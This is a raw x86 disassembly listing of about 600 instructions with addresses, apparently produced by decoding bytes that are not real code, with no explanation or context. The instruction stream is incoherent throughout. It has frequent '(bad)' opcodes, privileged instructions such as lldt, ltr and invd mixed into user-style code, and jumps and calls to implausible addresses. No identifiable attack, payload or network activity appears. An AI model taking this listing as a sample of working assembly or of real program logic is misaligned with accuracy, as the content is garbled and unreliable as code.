  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
